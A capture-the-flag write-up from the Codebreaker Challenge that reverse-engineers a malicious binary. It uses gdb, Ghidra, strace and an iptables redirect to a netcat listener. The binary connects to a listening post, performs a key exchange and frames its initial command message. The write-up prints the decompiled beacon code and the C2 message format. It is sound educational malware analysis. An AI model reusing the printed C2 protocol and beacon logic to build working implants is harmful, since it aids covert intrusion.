# Task 7

We are now in the solo portion of the Codebreaker Challenge, and our task is to further investigate the malicious binary extracted from the docker container in [task 6](../task-6).  As we progress, we will continue to update labels in Ghidra to enable easier reasoning about the binary's functionality.

Let's start by ensuring our addresses are still aligned in gdb and Ghidra, as we did in task 6.  I am using a base of `0x00005651fbee6000` for this run, but this may change as I work through problems and require restarting gdb.

As we continue working our way down the `gitGrabber` function, just after the `weuztpqjygefp` was called at `0x5651fbef0288`, we see a series of conditional checks before proceeding:

```c
   0x5651fbef0288 <_Z10gitGrabberv+114>:        call   0x5651fbeefc9f <weuztpqjygefp()>
   0x5651fbef028d <_Z10gitGrabberv+119>:        mov    DWORD PTR [rbp-0x200],eax
   0x5651fbef0293 <_Z10gitGrabberv+125>:        cmp    DWORD PTR [rbp-0x200],0xffffffff
   0x5651fbef029a <_Z10gitGrabberv+132>:        je     0x5651fbef038e <_Z10gitGrabberv+376>
   0x5651fbef02a0 <_Z10gitGrabberv+138>:        call   0x5651fbeefce9 <lycvvpbvaxksf()>
   0x5651fbef02a5 <_Z10gitGrabberv+143>:        test   eax,eax
   0x5651fbef02a7 <_Z10gitGrabberv+145>:        setne  al
   0x5651fbef02aa <_Z10gitGrabberv+148>:        test   al,al
   0x5651fbef02ac <_Z10gitGrabberv+150>:        jne    0x5651fbef0391 <_Z10gitGrabberv+379>
   0x5651fbef02b2 <_Z10gitGrabberv+156>:        lea    rax,[rbp-0x1a0]
   0x5651fbef02b9 <_Z10gitGrabberv+163>:        mov    rdi,rax
   0x5651fbef02bc <_Z10gitGrabberv+166>:        call   0x5651fbeefd7e <mdbtnecadvrrd(std::stringstream&)>
   0x5651fbef02c1 <_Z10gitGrabberv+171>:        mov    DWORD PTR [rbp-0x1fc],eax
   0x5651fbef02c7 <_Z10gitGrabberv+177>:        cmp    DWORD PTR [rbp-0x1fc],0x0
   0x5651fbef02ce <_Z10gitGrabberv+184>:        jne    0x5651fbef0394 <_Z10gitGrabberv+382>
```

The corresponding decompilation from Ghidra:

```c
  __fd = weuztpqjygefp();
  if (((__fd != -1) && (iVar3 = lycvvpbvaxksf(), iVar3 == 0)) &&
     (iVar3 = mdbtnecadvrrd(&ss), iVar3 == 0)) {
```

The first check is ensuring that the file `/tmp/.gglock` was successfully opened.  Of note, if `.gglock` already exists, opening will fail.  The next two checks, which check the results of `lycvvpbvaxksf` and `mdbtnecadvrrd`, are loading a git repo in `/usr/local/src/repo` and iterating through said git repo respectively.  Essentially, for these conditions to pass, we need to ensure that `/tmp/.gglock` does not already exist, and that there is a valid git repository initialized in `/usr/local/src/repo`.  The former is as easy as manually deleting `/tmp/.gglock` if it exists, and we can initialize our own empty git repository in `/usr/local/src/repo` for the latter with `git init`.

As we continue executing, we get to `gitGrabber+334`, where we prepare to call `ywiuyvacoapljPKctS0`.  Some initial exploration in Ghidra indicates that this function contains a considerable amount of the functionality of this binary.  The section below is a small subset and our first obsticle for continuing our analysis:  

```c
  username = getlogin();
  if (username == (char *)0x0) {
    username = decryptString(5);
  }
  version_00 = decryptString(0x11);
  uname((utsname *)&ubuf);
  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
  fingerprint(&fp,username,version_00,ubuf.sysname,tv.tv_sec);
                    /* try { // try from 0015a6ea to 0015a6ee has its CatchHandler @ 0015ac64 */
  fpToK(&session_key,username,version_00,tv.tv_sec);
                    /* try { // try from 0015a6f4 to 0015a746 has its CatchHandler @ 0015ac50 */
  cikyvjbgzkirt(0x11);
  cikyvjbgzkirt(5);
  sock_00 = higwbxbrkvcvt(ip,port);
  if (-1 < sock_00) {
```

Here we can see that some interesting details seem to be getting gathered in prep for some potential socket activity.  At the end, we see a call to `higwbxbrkvcvt`, which based on the arguments looks like it may be initializing a socket connection, and then checking to ensure the connection was successful before continuing.  Proceeding with our dynamic execution in gdb, it appears as though the binary attempts to connect to `198.51.100.233` port `6666`.  Stepping over this function call hangs for several seconds, and then returns `-1`, indicating failure.  Let's double check ourselves with `strace`:

```bash
# apk add strace
# strace make
...
open("/tmp/.gglock", O_WRONLY|O_CREAT|O_EXCL|O_LARGEFILE, 0644) = 3
...
...
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 5
connect(5, {sa_family=AF_INET, sin_port=htons(6666), sin_addr=inet_addr("198.51.100.233")}, 16) = -1 ECONNREFUSED (Connection refused)
close(5)        
...
```

`strace` produces a ton of interesting syscall information for us, to include the above calls to open, and our failed socket connection as we suspected.  We will need a way to continue past this point in our dynamic analysis.  We have a couple options at our disposal:  We could modify the return value of the call to `higwbxbrkvcvt` to trick the program into thinking it had a successful connection.  We could also redirect connection attempts to the target ip to localhost where we have a waiting netcat listener.  Let's go with the former.

To do so, we'll leverage `iptables`, which we'll need to ensure our docker configuration supports.  For `iptables` to work, we need our container to run in privileged mode and have access to the `NET_ADMIN` capability.  Exit out of the container and re-run it with the following:

```bash
$ docker run --privileged --cap-add=NET_ADMIN -it panic-nightly-test sh
```

Run the following to re-download the tools we were using, and configure iptables to re-route traffic to our LP back to localhost:

```bash
# apk add wget curl iptables gdb
# wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
# sysctl -w net.ipv4.conf.eth0.route_localnet=1
# iptables -t nat -A OUTPUT -d 198.51.100.233 -j DNAT --to-destination 127.0.0.1
```

Now, any traffic destined for the LP should head straight back to us instead.  We just need a listening server to accept connections, which we can use netcat for:

```bash
# nc -l -p 6666
```

Let's take another look at the Ghidra decompilation so we know what to expect after a successful connection:

```c
  sock_00 = connectToIpAndPort(ip,port);
  if (-1 < sock_00) {
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
              ((basic_string *)&local_1c8);
                    /* try { // try from 0015a759 to 0015a75d has its CatchHandler @ 0015abad */
    result = ztwacocfpsxpg(sock_00,&local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
    if (result == 0) {
                    /* try { // try from 0015a794 to 0015a798 has its CatchHandler @ 0015ac50 */
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                ((basic_string *)&local_1e8);
                    /* try { // try from 0015a7ad to 0015a7b1 has its CatchHandler @ 0015abd8 */
      oqnsgapelvghd(&local_1c8,&local_1e8);
```

Once successfully connected, the program will call `ztwacocfpsxpg`, and if the return value is `0`, it will continue and call `oqnsgapelvghd`.  Let's look at `ztwacocfpsxpg` first:

```c
int ztwacocfpsxpg(int sock,string *fp)

{
  int iVar1;
  long lVar2;
  long lVar3;
  size_t bufLen;
  void *vbuf;
  long in_FS_OFFSET;
  allocator<char> local_15d;
  int result;
  char *pubKey;
  size_t bodyLen;
  string client_secret;
  string client_public;
  string public_key;
  string nonce;
  string ciphertext;
  string length_header;
  string payload;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_68;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_48;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  result = -1;
  pubKey = (char *)0x0;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 00159a9e to 00159aa2 has its CatchHandler @ 00159d63 */
  crypto_box_curve25519xsalsa20poly1305_ref_keypair((basic_string *)&client_public);
                    /* try { // try from 00159aa8 to 00159aac has its CatchHandler @ 00159d4f */
  pubKey = decryptString(0x12);
  std::allocator<char>::allocator();
                    /* try { // try from 00159ae3 to 00159ae7 has its CatchHandler @ 00159cb5 */
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
            ((char *)&public_key,(ulong)pubKey,(allocator *)0x20);
  std::allocator<char>::~allocator(&local_15d);
                    /* try { // try from 00159b06 to 00159b0a has its CatchHandler @ 00159d3b */
  lybecqnstgmsh(&nonce,0x18);
                    /* try { // try from 00159b34 to 00159b38 has its CatchHandler @ 00159d27 */
  crypto_box_curve25519xsalsa20poly1305_ref
            ((basic_string *)&ciphertext,(basic_string *)fp,(basic_string *)&nonce,
             (basic_string *)&public_key);
  lVar2 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  lVar3 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  bodyLen = lVar3 + lVar2;
                    /* try { // try from 00159b78 to 00159b7c has its CatchHandler @ 00159d13 */
  lengthHeader(&length_header,bodyLen);
                    /* try { // try from 00159b95 to 00159b99 has its CatchHandler @ 00159cff */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_68,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&client_public,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&length_header);
                    /* try { // try from 00159baf to 00159bb3 has its CatchHandler @ 00159cdd */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_48,&local_68,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&nonce);
                    /* try { // try from 00159bc9 to 00159bcd has its CatchHandler @ 00159ccc */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            ((basic_string<char,std--char_traits<char>,std--allocator<char>> *)&payload,&local_48,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&ciphertext);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_48);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_68);
  bufLen = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
  vbuf = (void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::data
                           ();
                    /* try { // try from 00159c12 to 00159c2e has its CatchHandler @ 00159cee */
  result = hlsftryfiivkd(sock,vbuf,bufLen);
  cikyvjbgzkirt(0x12);
  iVar1 = result;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&payload);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&length_header);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&ciphertext);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&nonce);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&public_key);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&client_public);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&client_secret);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1;
}
```

Here we see some crypto function calls which include the public key we derived in task 6.  It seems to be encrypting a message, and then calling `hlsftryfiivkd` with a reference to our open socket and the encrypted result.  Digging into `hlsftryfiivkd` indicates that it is responsible for sending data over a socket, so we can update the label accordingly.  

The challenge prompt menitons that there is an initial crypt negotiation in communications with the LP.  It is likely that the function `ztwacocfpsxpg` is this initial crypt negotiation.  Let's update the label to reflect that, and then move on to explore `oqnsgapelvghd`:

```c
string * oqnsgapelvghd(string *__return_storage_ptr__,string *uuid)

{
  size_t length;
  long in_FS_OFFSET;
  string *message;
  string magic_start;
  string cmd_param;
  string cmd_length;
  string cmd_data;
  string uuid_param;
  string uuid_length;
  string magic_end;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_e8;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_c8;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_a8;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_88;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_68;
  basic_string<char,std--char_traits<char>,std--allocator<char>> local_48;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  pjultvsecmtco(&magic_start,MAGIC_START);
                    /* try { // try from 0015e59b to 0015e59f has its CatchHandler @ 0015e8ae */
  pjultvsecmtco(&cmd_param,PARAM_CMD);
                    /* try { // try from 0015e5af to 0015e5b3 has its CatchHandler @ 0015e89a */
  gitumnavwbata(&cmd_length,2);
                    /* try { // try from 0015e5ca to 0015e5ce has its CatchHandler @ 0015e886 */
  pjultvsecmtco(&cmd_data,COMMAND_INIT);
                    /* try { // try from 0015e5e5 to 0015e5e9 has its CatchHandler @ 0015e872 */
  pjultvsecmtco(&uuid_param,PARAM_UUID);
  length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
                    /* try { // try from 0015e609 to 0015e60d has its CatchHandler @ 0015e85e */
  gitumnavwbata(&uuid_length,length);
                    /* try { // try from 0015e620 to 0015e624 has its CatchHandler @ 0015e84a */
  pjultvsecmtco(&magic_end,MAGIC_END);
                    /* try { // try from 0015e640 to 0015e644 has its CatchHandler @ 0015e836 */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_e8,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&magic_start,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&cmd_param);
                    /* try { // try from 0015e660 to 0015e664 has its CatchHandler @ 0015e822 */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_c8,&local_e8,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&cmd_length);
                    /* try { // try from 0015e680 to 0015e684 has its CatchHandler @ 0015e80e */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_a8,&local_c8,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&cmd_data);
                    /* try { // try from 0015e69d to 0015e6a1 has its CatchHandler @ 0015e7fa */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_88,&local_a8,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&uuid_param);
                    /* try { // try from 0015e6b7 to 0015e6bb has its CatchHandler @ 0015e7e9 */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_68,&local_88,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&uuid_length);
                    /* try { // try from 0015e6d1 to 0015e6d5 has its CatchHandler @ 0015e7d8 */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            (&local_48,&local_68,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)uuid);
                    /* try { // try from 0015e6ee to 0015e6f2 has its CatchHandler @ 0015e7c7 */
  std::operator+<char,std--char_traits<char>,std--allocator<char>>
            ((basic_string<char,std--char_traits<char>,std--allocator<char>> *)
             __return_storage_ptr__,&local_48,
             (basic_string<char,std--char_traits<char>,std--allocator<char>> *)&magic_end);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_48);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_68);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_88);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_a8);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_c8);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_e8);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&magic_end);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&uuid_length);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&uuid_param);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd_data);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd_length);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd_param);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&magic_start);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return __return_storage_ptr__;
}
```

Here we see several function calls that at first glance appear to be populating several strings with values such as `MAGIC_START` and `PARAM_CMD`.  These values are hardcoded and live in the `data` section of our program.  Here's a list of each of the values used in this function:

| Name | Hex Value |
| ---- | ----- |
| MAGIC_START | 115dcb2a |
| PARAM_CMD | 6e00 |
| CMD_INIT | 0002 |
| PARAM_UUID | 6e08 |
| MAGIC_END | ee37e614 |

In addition to populating these strings with hardcoded values, there are a couple calls that seem to be populating strings with variable integer values, and digging into these integer functions shows that `htons` is being utilized for this.  After all strings are populated, there are a series of `std::operator+` calls, which indicate string concatenation.  From static analysis, it appears as though the message being crafted has the following format:

```
[MAGIC_START][PARAM_CMD][CMD_LENGTH][CMD_INIT][PARAM_UUID][UUID_LENGTH][UUID][MAGIC_END]
```

Knowing the hardcoded values, and knowing that UUIDs are typically 16 bytes, we can imagine a resulting `34` byte sequence that looks like this:

```
115dcb2a6e00000200026e080010xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxee37e614
```

where the `x` characters are placeholders for the UUID.  Let's jump back to `gdb` and step over this function to observe the output to see if we are correct in our assumptions:

```bash
gef➤  br *(ywiuyvacoaplj+521)
gef➤  c
gef➤  ni
gef➤  telescope $rax 1
0x00007fffffffe920│+0x0000: 0x00007ffff78b0b10  →  0x0200006e2acb5d11    ← $rax
gef➤  x/34bx 0x00007ffff78b0b10
0x7ffff78b0b10: 0x11    0x5d    0xcb    0x2a    0x6e    0x00    0x00    0x02
0x7ffff78b0b18: 0x00    0x02    0x6e    0x08    0x00    0x10    0x86    0x95
0x7ffff78b0b20: 0x0c    0x88    0xf0    0x25    0xb9    0xc3    0x6d    0x49
0x7ffff78b0b28: 0x84    0x3a    0xc5    0x55    0xcf    0x37    0xee    0x37
0x7ffff78b0b30: 0xe6    0x14
```

If we consolidate each byte, we get the following:

```bash
115dcb2a6e00000200026e08001086950c88f025b9c36d49843ac555cf37ee37e614
```

This looks exactly like what we had predicted, but now with a UUID filled in.  Looking back in Ghidra, we can see that the UUID is derived from a call that generates 16 random bytes.  This looks like it may be our plain text init message, so let's fill in the UUID that the challenge provided us, and submit as our answer.  This successfully completes task 7.  